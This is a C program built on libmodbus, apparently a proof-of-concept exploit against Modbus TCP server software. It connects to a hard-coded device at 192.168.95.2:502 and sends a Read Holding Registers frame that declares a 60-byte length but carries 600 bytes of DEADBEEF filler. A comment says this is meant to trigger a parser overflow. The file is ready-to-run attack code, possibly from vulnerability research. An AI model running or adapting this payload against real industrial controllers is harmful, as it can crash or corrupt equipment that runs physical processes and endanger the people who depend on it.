#include <errno.h>
#include <modbus.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define TARGET_IP "192.168.95.2"
#define TARGET_PORT 502
// Declare a short length (60 bytes) while actually sending 600 bytes to trigger the parser bug.
#define DECLARED_LENGTH 60
#define ACTUAL_PDU_LENGTH 600
#define QUERY_SIZE (7 + ACTUAL_PDU_LENGTH)

static int send_all(int fd, const uint8_t *buf, size_t len) {
    size_t total = 0;
    while (total < len) {
        ssize_t rc = send(fd, buf + total, len - total, 0);
        if (rc == -1) {
            return -1;
        }
        total += (size_t)rc;
    }
    return 0;
}

int main(void) {
    modbus_t *ctx = modbus_new_tcp(TARGET_IP, TARGET_PORT);
    if (!ctx) {
        fprintf(stderr, "modbus_new_tcp failed\n");
        return EXIT_FAILURE;
    }

    if (modbus_connect(ctx) == -1) {
        fprintf(stderr, "modbus_connect failed: %s\n", modbus_strerror(errno));
        modbus_free(ctx);
        return EXIT_FAILURE;
    }

    uint8_t query[QUERY_SIZE];
    memset(query, 0, sizeof(query));

    // Build MBAP header followed by the crafted PDU payload.
    query[0] = 0x00; // Transaction ID high
    query[1] = 0x01; // Transaction ID low
    query[2] = 0x00; // Protocol ID high
    query[3] = 0x00; // Protocol ID low
    query[4] = (DECLARED_LENGTH >> 8) & 0xFF; // Length high (declared)
    query[5] = DECLARED_LENGTH & 0xFF;        // Length low (declared)
    query[6] = 0x01; // Unit ID
    query[7] = 0x03; // Function code (Read Holding Registers)
    query[8] = 0x00; // Start address high
    query[9] = 0x00; // Start address low
    query[10] = 0x00; // Quantity high
    query[11] = 0x10; // Quantity low (16 registers)

    /* Fill the payload with a repeating marker pattern (DE AD BE EF) so the
     * overflow is easy to spot when examining memory in gdb. */
    static const uint8_t marker[] = {0xDE, 0xAD, 0xBE, 0xEF};
    for (size_t i = 12; i < sizeof(query); ++i) {
        query[i] = marker[(i - 12) % sizeof(marker)];
    }

    int sock = modbus_get_socket(ctx);
    if (sock == -1) {
        fprintf(stderr, "modbus_get_socket failed\n");
        modbus_close(ctx);
        modbus_free(ctx);
        return EXIT_FAILURE;
    }

    if (send_all(sock, query, sizeof(query)) == -1) {
        fprintf(stderr, "send failed: %s\n", strerror(errno));
        modbus_close(ctx);
        modbus_free(ctx);
        return EXIT_FAILURE;
    }

    uint8_t response[260];
    ssize_t received = recv(sock, response, sizeof(response), 0);
    if (received == -1) {
        fprintf(stderr, "recv failed: %s\n", strerror(errno));
    } else if (received == 0) {
        fprintf(stderr, "Connection closed by peer without response\n");
    } else {
        printf("Received %zd bytes:\n", received);
        for (ssize_t i = 0; i < received; ++i) {
            printf("%02x ", response[i]);
            if (i % 16 == 15) {
                printf("\n");
            }
        }
        if (received % 16 != 0) {
            printf("\n");
        }
    }

    modbus_close(ctx);
    modbus_free(ctx);
    return EXIT_SUCCESS;
}
